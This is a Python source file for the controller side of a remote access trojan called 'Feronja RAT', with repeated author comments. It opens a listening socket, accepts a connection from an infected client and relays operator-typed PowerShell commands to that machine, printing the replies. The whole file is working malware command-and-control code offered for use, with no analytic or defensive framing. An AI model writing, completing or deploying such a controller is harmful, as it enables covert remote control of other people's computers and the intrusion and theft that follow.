import socket
import subprocess
import select
import os
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
server_address = ('0.0.0.0', 9999)
#By Achilles
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#By Achilles
server_socket.bind(server_address)
#By Achilles
server_socket.listen(1)
clear_screen()
print("""\033[38;5;208m
   ____                    _     
  / __/__ _______  ___    (_)__ _
 / _// -_) __/ _ \/ _ \  / / _ `/
/_/  \__/_/  \___/_//_/_/ /\_,_/ 
                     |___/       
\033[0m""")
print("\033[38;5;208mFeronja RAT Started!\033[0m")
print("\033[38;5;208mServer is listening for connections...\033[0m")
#By Achilles
client_socket, client_address = server_socket.accept()
#By Achilles
while True:
    command = input("\033[38;5;208mEnter a PowerShell command to execute on the client (or 'exit' to quit): \033[0m")
#By Achilles
    if command.strip().lower() == 'exit':
        client_socket.send(command.encode())
        break
    elif command.strip():
        client_socket.send(command.encode())
    else:
        continue
#By Achilles
    ready = select.select([client_socket], [], [], 10)
    if ready[0]:
        response = client_socket.recv(1024).decode()
        print("\033[38;5;208mResponse from client:\033[0m")
        print(response)
    else:
        print("\033[38;5;208mNo response received from client within the timeout period.\033[0m")
#By Achilles
client_socket.close()
server_socket.close()
#By Achilles